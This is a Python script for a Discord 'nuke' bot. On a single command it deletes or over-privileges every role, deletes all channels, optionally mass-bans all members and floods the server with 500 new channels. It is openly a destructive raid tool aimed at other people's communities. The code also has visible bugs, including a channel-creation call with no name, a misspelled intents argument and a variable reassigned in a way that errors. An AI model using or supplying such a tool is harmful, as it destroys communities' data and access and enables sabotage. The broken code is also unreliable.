import discord
from discord.ext import commands
import yaml
import random
configpath = ''
if not configpath:
    configpath = 'config.nuke'


config = yaml.safe_load(open(configpath))
token = config['requirements']['bot_token']
prefix = config['requirements']['bot_prefix']
rolenuke = config['requirements']['role_nuke_on']
memberban = config['requirements']['massban_on']
channelname = config['requirements']['channelname']
bot = commands.Bot(command_prefix=prefix, intent=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    print(f'Connected to {bot.user}')
@bot.command(name='nuke')
async def nuke(ctx):
    if rolenuke == True:
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                pass
    else:
        for role in ctx.guild.roles:
            try:
                await role.edit(permissions = discord.Permissions.all())
            except:
                pass
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    if memberban == True:
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                pass
    else:
        pass
    for x in range(500):
        if channelname == None:
            channelname = random.randint(5555555, 99999999)
        await ctx.guild.create_text_channel()



bot.run(token, bot=True)
